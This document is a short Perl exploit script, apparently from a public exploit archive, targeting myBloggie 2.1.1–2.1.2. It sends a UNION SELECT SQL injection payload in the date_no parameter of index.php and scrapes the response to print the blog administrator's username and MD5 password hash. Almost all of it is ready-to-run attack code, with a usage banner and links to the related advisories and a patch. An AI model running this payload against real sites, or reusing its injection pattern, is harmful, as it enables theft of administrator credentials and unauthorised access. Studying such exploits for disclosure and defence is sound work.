#!/usr/bin/perl -w
#
# SQL Injection Exploit for myBloggie 2.1.1 - 2.1.2
# This exploit show the username of the administrator of the blog and his password crypted in MD5
# Related advisories: (Italian) http://www.codebug.org/index.php?subaction=showfull&id=1115310052&archive=&start_from=&ucat=6&
#                     (English) http://www.packetstormsecurity.org/0505-advisories/codebug-9.txt
# Patch: http://mywebland.com/forums/viewtopic.php?t=180
# Coded by Alberto Trivero and Discovered with CorryL

use LWP::Simple;

print "\n\t=======================================\n";
print "\t= Exploit for myBloggie 2.1.1 - 2.1.2 =\n";
print "\t=    Alberto Trivero - codebug.org    =\n";
print "\t=======================================\n\n";

if(!$ARGV[0] or !($ARGV[0]=~/http/) or !$ARGV[1] or ($ARGV[1] ne '2.1.1' and $ARGV[1] ne '2.1.2')) {
   print "Usage:\nperl $0 [full_target_path] [version: 2.1.1 OR 2.1.2]\n\nExample:\nperl $0 http://www.example.com/mybloggie/ 2.1.1\n";
   exit(0);
}

$url=q[index.php?month_no=1&year=1&mode=viewdate&date_no=1%20UNION%20SELECT%20null,null,null,null,user,password,null,null,null,null%20FROM%20blog_user/*];
$page=get($ARGV[0].$url) || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $ARGV[0]\n";
if($ARGV[1] eq '2.1.1') {
   $page=~m/<tr><td colspan="3" class="subject">(.*?)<\/td><\/tr>/ && print "[+] Username of administrator is: $1\n";
   print "[-] Unable to retrieve username\n" if(!$1);
}
else {
   $page=~m/<img src="templates\/aura\/images\/permalink.gif" border="0" title="Permalink"><\/a> (.*?)<\/td><\/tr>/ && print "[+] Username of administrator is: $1\n";
   print "[-] Unable to retrieve username\n" if(!$1);
}
$page=~m/<tr><td colspan="3" class="message">(.*?)<\/td><\/tr>/ && print "[+] MD5 hash of password is: $1\n";
print "[-] Unable to retrieve hash of password\n" if(!$1);


# milw0rm.com [2005-05-31]
